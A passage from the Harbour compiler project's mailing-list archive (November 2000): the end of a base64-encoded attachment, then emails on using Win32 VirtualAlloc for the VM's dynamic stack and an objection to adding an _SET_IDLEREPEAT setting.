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
OgAAAHEqAAAAAA==


------=_NextPart_000_48ae_30d4_1060--

From harbour@lists.harbour-project.org  Fri Nov 24 21:10:04 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Fri Nov 24 21:10:04 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random gpfs)
In-Reply-To: <3A1D5AB3.BB85C306@libero.it>
Message-ID: <LOBBKAFMMFGJIKLMEPAKMEHGDHAA.ron@profit-master.com>

Maurilio,

Win32 has VirtualAlloc( LPVOID lpAddress, SIZE_T dwSize, DWORD
flAllocationType, DWORD flProtect )

It does allow reserve and then commit.

This is probably the simplest, fastest way to keep our Dynamic Stack without
changing any logic.

It is available in OS/2 and Win32, any one care to check *X?

Ron

> Ryszard,
>
> I think we should investigate memory allocation and commitment under
> win32 (linux and OS/2 are surely ok and I can't belive that there isn't
> something similar under win32 as well).
>
> Sadly I don't know win32 api, so I'll have to go to micro$oft site and
> start wandering.
>
> This way we would have a single stack object (and single symbols
> "container" as well).
>
> regards.


From harbour@lists.harbour-project.org  Fri Nov 24 21:23:01 2000
From: harbour@lists.harbour-project.org (Victor Szakats)
Date: Fri Nov 24 21:23:01 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas <ron@profit-master.com>
References: <LOBBKAFMMFGJIKLMEPAKIEHEDHAA.ron@profit-master.com>
Message-ID: <017001c05686$c84a1ac0$0a0ac8c8@VECWS1>

Ron,


>    * include/hbset.h
>    * include/set.ch
>    * source/pp/pptable.c
>      + Added _SET_IDLEREPEAT = 101
>    * source/rtl/set.c
>      + Added support for SET( _SET_IDLEREPEAT ) - Default is .T.

I think it's a bad idea to move this setting to the SETs, since this breaks 
the modularity of Harbour idle system for the sake of a very minor feature.
This way it also pollutes PP namespace.

This solution also falls far from the suggestions. (per task setting passed to 
HB_IDLEADD()).

You didn't answer to my question for any possible uses for a non-repeating 
idle task.

> /* I suggest we add HB_IDLEALL() and rename HB_IDLESTATE() to HB_IDLESTEP()
> */

Why ?

Victor Szakats



From harbour@lists.harbour-project.org  Fri Nov 24 21:24:02 2000
